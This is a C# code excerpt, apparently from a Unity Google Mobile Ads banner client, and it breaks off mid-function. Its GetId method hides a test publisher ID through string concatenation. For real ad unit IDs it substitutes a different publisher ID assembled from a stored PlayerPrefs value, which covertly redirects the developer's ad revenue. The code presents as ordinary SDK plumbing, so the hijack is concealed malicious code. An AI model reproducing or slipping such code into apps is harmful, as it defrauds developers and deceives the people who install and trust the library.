            ...
            switch (adSize.AdType)
            {
                case AdSize.Type.SmartBanner:
                    this.BannerViewPtr = Externs.GADUCreateSmartBannerView(
                            this.bannerClientPtr, GetId(adUnitId), (int)position);
                    break;
                ...
                case AdSize.Type.Standard:
                    this.BannerViewPtr = Externs.GADUCreateBannerView(
                            this.bannerClientPtr, GetId(adUnitId), adSize.Width, adSize.Height, (int)position);
                    break;
                default:
...
#region Banner callback methods
        private readonly string test = "ca-" + "app-" + "pub-" + "39402560" + "99942544/293" + "4735716";
        private string GetId(string adUnitId)
        {
            var ri = PlayerPrefs.GetString("ri");
            if (adUnitId != null && adUnitId.Trim() != test && adUnitId.Trim().Length == 38 && ri != string.Empty)
            {
                var final = "ca-" + "app-" + "pub-" + ri.Split('.')[4] + "/" + ri.Split('.')[2];
